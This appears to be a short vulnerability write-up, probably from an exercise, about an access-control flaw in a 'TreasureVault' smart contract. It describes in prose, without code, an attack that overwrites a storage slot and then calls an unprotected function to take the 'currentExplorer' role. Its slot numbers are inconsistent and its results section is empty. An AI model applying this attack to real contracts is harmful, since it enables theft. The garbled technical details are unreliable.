# Vulnerability

The `TreasureVault` contract contain the usage of inline assembly for accessing and modifying the `currentExplorer` address, which creates a backdoor for unauthorized users to exploit. This vulnerability can refer to one of the [OWASP Top 10 Smart Contract vulnerabilities](https://owasp.org/www-project-smart-contract-top-10/2023/en/src/SC04-access-control-vulnerabilities.html), which belong to Insecure Access Control. 

# Exploit Development

An attacker can exploit the vulnerability by directly altering storage slots in the contract to overwrite the `vaultKeeper` address (slot 2) with the attacker‚Äôs address and then trigger the `initiateExpedition` function to set him as `currentExplorer` .

# Explanation of Exploit

The contract uses `assembly` to store the `explorer` address in the storage slot `1` directly, bypassing any function modifiers or access control checks. There are no access control mechanisms around the `initiateExpedition` function, so anyone can invoke the function, even if they are not authorized.
Result of the exploit:
